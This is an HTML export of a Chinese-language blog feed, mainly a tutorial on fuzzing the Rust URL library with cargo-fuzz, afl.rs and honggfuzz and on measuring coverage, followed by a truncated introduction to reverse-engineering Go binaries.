class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">rustup default<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装nightly版本</span><br>rustup install nightly<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置为默认编译器</span><br>rustup default nightly<br><span class="hljs-meta prompt_"># </span><span class="language-bash">正确输出示例：</span><br>nightly-x86_64-unknown-linux-gnu (default)<br></code></pre></td></tr></table></figure><ul><li>安装 cargo-fuzz 工具</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo install cargo-fuzz<br></code></pre></td></tr></table></figure><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>接下来我们将对 Rust 的 URL 解析库  <a href="https://github.com/servo/rust-url">rust-url</a> 进行 Fuzz，目标就是找到使其崩溃的 crash。</p><ul><li>环境搭建</li></ul><p>首先，克隆 rust-url 项目并切换指定提交：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/servo/rust-url.git<br>cd rust-url<br><br>git checkout bfa167b4e0253642b6766a7aa74a99df60a94048<br></code></pre></td></tr></table></figure><p>初始化 Fuzz 环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz init<br></code></pre></td></tr></table></figure><p>查看现有的 fuzz 目标</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cargo fuzz list</span><br></code></pre></td></tr></table></figure><p><img src="/Linux/assets/Pasted%20image%2020250613132204.png"></p><ul><li>配置测试目标</li></ul><p>编辑默认生成的测试文件<code>fuzz-targets/fuzz_target_1.rs</code>，修改为以下内容。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![no_main]</span><br><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> libfuzzer_sys;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> url;<br><br>fuzz_target!(|data: &amp;[<span class="hljs-type">u8</span>]| &#123;<br>    <span class="hljs-comment">// 你的模糊测试代码</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(s) = std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(data) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">_</span> = url::Url::<span class="hljs-title function_ invoke__">parse</span>(s);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><blockquote><p><code>fuzz_target!</code>是 cargo-fuzz 提供的宏，用于定义 Fuzz 入口。libFuzzer 会持续调用它，并传入生成的数据。类似于 C&#x2F;C++ 中的<code>LLVM</code></p></blockquote><ul><li>开始Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz run fuzz_target_1<br></code></pre></td></tr></table></figure><p>在跑了一会之后程序就直接 crash 了，并将crash 样本保存到了。</p><p><img src="/Linux/assets/Pasted%20image%2020250613133117.png"></p><ul><li>使用保存的 crash 调试</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">RUST_BACKTRACE=1 cargo fuzz run &lt;target-name&gt; &lt;path/to/crash&gt;<br></code></pre></td></tr></table></figure><ul><li>cargo fuzz add target：创建新的模糊测试目标</li><li>cargo fuzz run target：运行模糊测试目标</li><li>cargo fuzz fmt target input：打印测试用例的输入</li><li>cargo fuz tmin target input：发送输入失败？缩小到最小输入</li><li>cargo fuzz cmin target：缩小输入语料库</li><li>cargo fuzz coverage：生成覆盖率信息</li></ul><h3 id="libFuzzer参数"><a href="#libFuzzer参数" class="headerlink" title="libFuzzer参数"></a>libFuzzer参数</h3><p>通过<code>--</code>向 libFuzzer 传参：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz run target_name -- -max_len=512 -only_ascii=1<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><code>-ignore_crashes=1</code>：即使遇到崩溃也继续 Fuzz。</li><li><code>-s,--sanitizer</code>：选择 Sanitizer。</li><li><code>-max_len=&lt;len&gt;</code>：限制输入最大长度。</li><li><code>-runs=&lt;number&gt;</code>：限制运行次数。</li><li><code>-max_total_time=&lt;sec&gt;</code>：限制总运行时间（秒）。</li><li><code>-timeout=&lt;sec&gt;</code>：单次运行超时时间（秒）。</li><li><code>-only_ascii=1</code>：仅生成 ASCII 输入。</li><li><code>-dict=&lt;file&gt;</code>：使用字典文件。</li><li><code>-c, --careful</code>：开启额外的安全检查。</li><li><code>--no-cfg-fuzzing</code>：禁用默认的<code>cfg(fuzzing)</code>编译配置。</li></ul><h2 id="afl-rs"><a href="#afl-rs" class="headerlink" title="afl.rs"></a>afl.rs</h2><p><code>afl.rs</code>是基于 AFL（American Fuzzy Lop） 的一个 Rust 语言 Fuzz 框架，它允许你在 Rust 项目中复用 AFL 强大的变异引擎和崩溃检测能力。</p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li>cargo 安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo install cargo-afl<br></code></pre></td></tr></table></figure><ul><li>源码安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/rust-fuzz/afl.rs<br>cd afl.rs<br>git submodule update --init<br>cargo install --path cargo-afl<br></code></pre></td></tr></table></figure><p>如果 cargo-afl 出现崩溃，可以尝试添加<code>--debug</code>参数安装。</p><h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>同样以 URL 解析库  <a href="https://github.com/servo/rust-url">rust-url</a> 为例。</p><ul><li>环境搭建</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo new --bin url-fuzz-target<br>cd url-fuzz-target<br></code></pre></td></tr></table></figure><p>我们需要在该项目中添加两个依赖项：</p><ul><li><code>url</code>：我们要测试的库</li><li><code>afl</code>：提供了一些辅助函数，帮助编写模糊测试目标</li></ul><p>将这些添加到<code>Cargo.toml</code>文件中</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">afl</span> = <span class="hljs-string">&quot;*&quot;</span><br><span class="hljs-attr">url</span> = &#123; git = <span class="hljs-string">&quot;https://github.com/servo/rust-url.git&quot;</span>, rev = <span class="hljs-string">&quot;bfa167b4e0253642b6766a7aa74a99df60a94048&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>编写模糊测试源文件：<code>src/main.rs</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> afl;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> url;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    fuzz!(|data: &amp;[<span class="hljs-type">u8</span>]| &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(s) = std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(data) &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">_</span> = url::Url::<span class="hljs-title function_ invoke__">parse</span>(&amp;s);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>fuzz!</code>宏会从 AFL 运行时提供的标准输入中读取数据投喂给目标程序。<code>fuzz!</code>宏内部用<code>catch_unwind</code>捕获 panic，确保拦截 panic 不至于直接让 Fuzz 进程退出。</p></blockquote><ul><li>构建目标</li></ul><p>通常，人们用来编译一个基于 Cargo 的 Rust 项目。要让 AFL 与 Rust 一起工作，需要在构建过程中将一些额外的编译器标志传递给 rustc。为了简化这一点，有一个 AFL cargo 子命令（由 crate 提供）可以自动为我们传递这些 rustc 标志。要使用它，您需要执行以下作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl build<br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果报错FL LLVM runtime was not built <span class="hljs-keyword">for</span> Rust rustc-1.89.0-nightly-99e7c15; run `cargo afl config --build` to build it.</span><br>cargo afl config --build<br></code></pre></td></tr></table></figure><ul><li>创建种子</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir in<br>echo &quot;tcp://example.com/&quot; &gt; in/url<br>echo &quot;ssh://192.168.1.1&quot; &gt; in/url2<br>echo &quot;http://www.example.com:80/foo?hi=bar&quot; &gt; in/url3<br></code></pre></td></tr></table></figure><ul><li>开始Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl fuzz -i in -o out target/debug/url-fuzz-target<br></code></pre></td></tr></table></figure><p><img src="/Linux/assets/Pasted%20image%2020250613140012.png"></p><ul><li>复现crash</li></ul><p>在运行模糊测试程序中收集到一些崩溃后，您可以通过手动将它们传递到测试用例来重现它们。这通常是通过 .例如，命令将是：<code>stdin</code> <code>url-fuzz-target</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl run url-fuzz-target &lt; out/default/crashes/crash_file<br></code></pre></td></tr></table></figure><p>其中是 fuzz 命令中的参数，是目录中的任意文件。<code>out</code> <code>-o</code> <code>crash_file</code> <code>crashes</code></p><h3 id="AFL的支持"><a href="#AFL的支持" class="headerlink" title="AFL的支持"></a>AFL的支持</h3><p><code>afl.rs</code>本质上是 AFL 模糊测试在 Rust 里的接口，它本身不直接解析或管理 AFL 的命令行参数。AFL 的参数主要由 AFL 或 AFL++ 的二进制模糊测试器（如 <code>afl-fuzz</code>）来处理，<code>afl.rs</code>只是提供 Rust 代码里的接口，让程序能接收 AFL 传入的输入，配合 AFL 的运行。</p><p>我们同样可以在 afl.rs 上使用很多 AFL 的功能，如字典、输入优化、持久模式。延迟插桩。并行。黑盒。</p><p>示例：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">cargo afl fuzz -i <span class="hljs-keyword">in</span> -o <span class="hljs-keyword">out</span> -x dict.txt <span class="hljs-keyword">target</span>/debug/your-fuzz-<span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure><ul><li><code>-x</code>：指定字典文件</li></ul><p>并行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl fuzz -i in -o out -S fuzzer01 target/debug/your-fuzz-target<br>cargo afl fuzz -i in -o out -S fuzzer02 target/debug/your-fuzz-target<br></code></pre></td></tr></table></figure><p>开启 ASan：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">RUSTFLAGS=&quot;-Z sanitizer=address&quot; cargo afl build<br>ASAN_OPTIONS=detect_leaks=0 cargo afl fuzz -i in -o out target/debug/your-fuzz-target<br></code></pre></td></tr></table></figure><h4 id="持久模式"><a href="#持久模式" class="headerlink" title="持久模式"></a>持久模式</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">input</span> = <span class="hljs-built_in">vec!</span>[];<br><span class="hljs-keyword">loop</span> &#123;<br>    afl::<span class="hljs-title function_ invoke__">read_stdio_into</span>(&amp;<span class="hljs-keyword">mut</span> input);<br>    <span class="hljs-comment">// 测试代码...</span><br>    input.<span class="hljs-title function_ invoke__">clear</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="honggfuzz"><a href="#honggfuzz" class="headerlink" title="honggfuzz"></a>honggfuzz</h2><p>确保已安装以下工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cargo install honggfuzz<br><span class="hljs-built_in">sudo</span> apt install libunwind-dev  <span class="hljs-comment"># Linux 上用于回溯解析</span><br></code></pre></td></tr></table></figure><blockquote><p>✅ 推荐安装：<code>honggfuzz-rs</code> 是 Rust 对 honggfuzz 的绑定和辅助集成库。</p></blockquote><hr><h3 id="项目结构设置"><a href="#项目结构设置" class="headerlink" title="项目结构设置"></a>项目结构设置</h3><ol><li>添加依赖（<code>Cargo.toml</code>）</li></ol><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">honggfuzz</span> = <span class="hljs-string">&quot;0.5&quot;</span><br></code></pre></td></tr></table></figure><hr><p>创建 <code>fuzz/fuzz_target.rs</code>（或其他名字）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">loop</span> &#123;<br>        honggfuzz::fuzz!(|data: &amp;[<span class="hljs-type">u8</span>]| &#123;<br>            <span class="hljs-comment">// 替换为你自己的目标逻辑，比如解析、反序列化、压缩等</span><br>            <span class="hljs-keyword">if</span> data.<span class="hljs-title function_ invoke__">starts_with</span>(<span class="hljs-string">b&quot;FUZZ&quot;</span>) &#123;<br>                <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Found FUZZ prefix!&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>honggfuzz::fuzz!</code> 是宏，负责从共享内存读取输入数据，并执行你提供的闭包。</p></blockquote><hr><h3 id="3-配置可执行目标（Cargo-toml-中加入）"><a href="#3-配置可执行目标（Cargo-toml-中加入）" class="headerlink" title="3. 配置可执行目标（Cargo.toml 中加入）"></a>3. 配置可执行目标（<code>Cargo.toml</code> 中加入）</h3><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[[bin]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;fuzz_target&quot;</span><br><span class="hljs-attr">path</span> = <span class="hljs-string">&quot;fuzz/fuzz_target.rs&quot;</span><br></code></pre></td></tr></table></figure><hr><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cargo build --release<br></code></pre></td></tr></table></figure><hr><p>开始 Fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">honggfuzz -i <span class="hljs-keyword">in</span>/ -o out/ -- ./target/release/fuzz_target<br></code></pre></td></tr></table></figure><ul><li><p><code>-i in/</code>：输入种子目录（可以为空）</p></li><li><p><code>-o out/</code>：输出崩溃&#x2F;挂起样本保存目录</p></li><li><p><code>-- ./target/release/fuzz_target</code>：运行目标程序</p></li></ul><p>你可以先创建空输入目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-keyword">in</span> out<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;test&quot;</span> &gt; <span class="hljs-keyword">in</span>/seed1<br></code></pre></td></tr></table></figure><hr><p>添加依赖：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">serde</span> = &#123; version = <span class="hljs-string">&quot;1.0&quot;</span>, features = [<span class="hljs-string">&quot;derive&quot;</span>] &#125;<br><span class="hljs-attr">serde_json</span> = <span class="hljs-string">&quot;1.0&quot;</span><br><span class="hljs-attr">honggfuzz</span> = <span class="hljs-string">&quot;0.5&quot;</span><br></code></pre></td></tr></table></figure><hr><p>其他功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexdump -C out/INPUT_*.fuzz<br></code></pre></td></tr></table></figure><p>或者用你的 target 手动重现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> out/INPUT_000000.fuzz | ./target/release/fuzz_target<br></code></pre></td></tr></table></figure><hr><p>多线程 &#x2F; 自定义 Corpus 路径</p><p>你可以使用多线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HFUZZ_RUN_ARGS=<span class="hljs-string">&quot;--threads 4&quot;</span> cargo run --release --bin fuzz_target<br></code></pre></td></tr></table></figure><p>或者使用手动 corpus：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HFUZZ_RUN_ARGS=<span class="hljs-string">&quot;-i corpus -o crashes&quot;</span> cargo run --release --bin fuzz_target<br></code></pre></td></tr></table></figure><h2 id="测量代码覆盖率"><a href="#测量代码覆盖率" class="headerlink" title="测量代码覆盖率"></a>测量代码覆盖率</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装 Nightly 工具链</span><br>rustup install nightly<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">为 Nightly 安装 LLVM 工具集（用于 coverage）</span><br>rustup component add --toolchain nightly llvm-tools-preview<br></code></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz coverage fuzz_target_name path/to/corpus/ -- &lt;target args&gt;<br></code></pre></td></tr></table></figure><ul><li>自动使用 <code>-C instrument-coverage</code> 重新编译你的目标程序（<code>nightly</code> 工具链）。</li><li>遍历语料库（corpus）目录中的每个输入，在子目录 <code>fuzz/coverage/&lt;target&gt;/raw/</code> 中生成 <code>.profraw</code> 覆盖数据。</li><li>自动调用 <code>llvm-profdata merge</code> 合并 <code>.profraw</code> 文件为 <code>coverage.profdata</code>。</li></ul><h3 id="可视化覆盖率信息"><a href="#可视化覆盖率信息" class="headerlink" title="可视化覆盖率信息"></a>可视化覆盖率信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo install cargo-binutils<br>rustup component add llvm-tools-preview<br></code></pre></td></tr></table></figure><p>生成 HTML 格式覆盖率报告：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo cov show fuzz/target/x86_64-unknown-linux-gnu/release/url_fuzz_target \<br>  --format=html \<br>  --Xdemangler=rustfilt \<br>  --instr-profile=fuzz/coverage/url_fuzz_target/coverage.profdata \<br><span class="hljs-meta prompt_">  &gt; </span><span class="language-bash">coverage.html</span><br></code></pre></td></tr></table></figure><p>终端查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo cov show --use-color \<br>  --instr-profile=fuzz/coverage/url_fuzz_target/coverage.profdata \<br>  fuzz/target/.../url_fuzz_target \<br>  --show-functions --show-instantiations<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>CVE-2020-36435：PNG 解码器中的整数溢出</p></blockquote><p>使用 afl.rs 复现 CVE-2020-36435</p><ul><li>环境搭建</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><ul><li>Fuzz</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对比两个 Fuzz工具：<code>cargo-fuzz</code>基于 LibFuzzer，适合快速上手和函数级模糊测试；而<code>afl.rs</code>基于 AFL，更适合稳定版本 Rust 和高性能的程序级 fuzz。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://github.com/rust-fuzz/trophy-case">rust-fuzz&#x2F;trophy-case: 🏆 Collection of bugs uncovered by fuzzing Rust code</a><br><a href="https://docs.rs/afl-stat/latest/afl_stat/#:~:text=This%20crate%20implement%20parsing%20AFL,file%20generated%20by%20AFL%20instances">afl_stat - Rust</a><br><a href="https://rust-fuzz.github.io/book/afl/setup.html">设置 - Rust Fuzz Book</a><br><a href="https://github.com/rust-fuzz/afl.rs/tree/master">rust-fuzz&#x2F;afl.rs: 🐇 Fuzzing Rust code with American Fuzzy Lop</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel基础入门</title>
      <link href="/2025/07/01/ctf/kernel/base/"/>
      <url>/2025/07/01/ctf/kernel/base/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM指令虚拟化分析</title>
      <link href="/2025/07/01/ctf/re/vm/"/>
      <url>/2025/07/01/ctf/re/vm/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向对抗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go逆向分析</title>
      <link href="/2025/07/01/ctf/re/go/"/>
      <url>/2025/07/01/ctf/re/go/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Go 语言类似于 C 语言，目标是一个二进制文件，逆向的也是 native 代码它有如下特性</p><ul><li>强类型检查的编译型语言，接近 C 但拥有原生的包管理，内建的网络包，协程等使其成为一款开发效率更高的工程级语言。</li><li>作为编译型语言它有开发速度快的优点，但是它又能通过内置的运行时符号信息实现反射这种动态特性。</li><li>Go语言作为一种内存安全的语言，他不仅有内建的垃圾回收，还在编译与运行时提供了大量的安全检查。</li></ul><p>Go通常使用静态链接程序，所以它会直接将库打包链接进来，因此程序体积会比较大。而且第三方库、标准库与用户代码混在一起，需要区分。</p><p>在分析 Go 语言编写的二进制程序前，需要弄清楚某一操作是发生在编译期间还是运行期间，能在编译时做的事就在编译时做，这能实现错误前移并提高运行效率等，而为了语言的灵活性引入的某些功能又必须在运行时才能确定，在这时就需要想到运行时它应该怎么做，又需要为它提供哪些数据，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>s:=[...]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%s %s\n&quot;</span>,s[<span class="hljs-number">0</span>],s[<span class="hljs-number">1</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>在第二行定义了一个字符串数组，第三行将其输出，编译阶段就能确定元素访问的指令以及下标访问是否越界，于是就可以去除 s 的类型信息。但是由于 Printf 的输入是<code>interface&#123;&#125;</code>类型，因此在编译时它无法得知传入的数据实际为什么类型。但是作为一个输出函数，希望传入数字时直接输出，传入数组时遍历输出每个元素，那么在传入参数时，就需要在编译时把实际参数的类型与参数绑定后再传入<code>Printf</code>，在运行时它就能跟进参数绑定的信息确定是什么类型了。</p><p>其实在编译时，编译器做的事还很多，从逆向看只需要注意它会将很多操作转换为<code>runtime</code>的内建函数调用，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a:=<span class="hljs-string">&quot;123&quot;</span><br>s:=<span class="hljs-string">&quot;abc&quot;</span>+a+<span class="hljs-string">&quot;cba&quot;</span><br></code></pre></td></tr></table></figure><p>将被转换为<code>concatstring3</code>函数调用：</p><p><img src="/assets/Pasted%20image%2020250108090404.png"></p><p>若需要观察某语法最终生成的汇编代码，出了使用 ida 还可以使用 Go 自带的工具。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span> tool <span class="hljs-built_in">compile</span> -N -l -S <span class="hljs-built_in">demo</span>.<span class="hljs-built_in">go</span>       <br></code></pre></td></tr></table></figure><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编译</span><br>go build demo.go<br><span class="hljs-meta prompt_">#</span><span class="language-bash">禁止优化</span><br>go build -gcflags=&quot;-N -l&quot; demo.go<br><span class="hljs-meta prompt_">#</span><span class="language-bash">去掉调试信息和符号</span><br>go build -ldflags=&quot;-w -s&quot; demo.go<br></code></pre></td></tr></table></figure><h2 id="调用约定与传参"><a href="#调用约定与传参" class="headerlink" title="调用约定与传参"></a>调用约定与传参</h2><p>Go 使用独特的调用约定。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><table><thead><tr><th>类型</th><th>32位</th><th>64位</th></tr></thead><tbody><tr><td>bool、int8、uint8</td><td>8bit</td><td>8bit</td></tr><tr><td>int16、uint16</td><td>16bit</td><td>16bit</td></tr><tr><td>int32、uint32、float32</td><td>32bit</td><td>32bit</td></tr><tr><td>int64、uint64、float64、complex64</td><td>64bit</td><td>64bit</td></tr><tr><td>int、uint、uintptr</td><td>32bit</td><td>64bit</td></tr><tr><td>cpmplex128</td><td>128bit</td><td>128bit</td></tr></tbody></table><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>传统的 C 是通过<code>\0</code>结束符来表示字符串结束位置，而 Go 语言则不同它通过存储字符串长度来确定字符串结束位置。</p><p>在 Go 中声明字符串是声明了一个字符串对象，一个字符串对象结构在内存中分为两部分，结构中使用两个字段存储字符串信息，分别存储字符串指针以及字符串长度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span 